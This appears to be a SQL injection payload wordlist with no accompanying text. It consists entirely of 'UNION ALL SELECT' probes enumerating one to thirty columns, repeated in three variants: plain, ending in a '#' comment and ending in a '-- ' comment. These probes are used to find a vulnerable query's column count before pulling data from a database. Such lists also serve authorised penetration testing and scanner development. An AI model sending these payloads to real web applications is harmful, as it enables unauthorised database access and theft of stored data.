UNION ALL SELECT 1
UNION ALL SELECT 1,2
UNION ALL SELECT 1,2,3
UNION ALL SELECT 1,2,3,4
UNION ALL SELECT 1,2,3,4,5
UNION ALL SELECT 1,2,3,4,5,6
UNION ALL SELECT 1,2,3,4,5,6,7
UNION ALL SELECT 1,2,3,4,5,6,7,8
UNION ALL SELECT 1,2,3,4,5,6,7,8,9
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
UNION ALL SELECT 1#
UNION ALL SELECT 1,2#
UNION ALL SELECT 1,2,3#
UNION ALL SELECT 1,2,3,4#
UNION ALL SELECT 1,2,3,4,5#
UNION ALL SELECT 1,2,3,4,5,6#
UNION ALL SELECT 1,2,3,4,5,6,7#
UNION ALL SELECT 1,2,3,4,5,6,7,8#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
UNION ALL SELECT 1-- 
UNION ALL SELECT 1,2-- 
UNION ALL SELECT 1,2,3-- 
UNION ALL SELECT 1,2,3,4-- 
UNION ALL SELECT 1,2,3,4,5-- 
UNION ALL SELECT 1,2,3,4,5,6-- 
UNION ALL SELECT 1,2,3,4,5,6,7-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 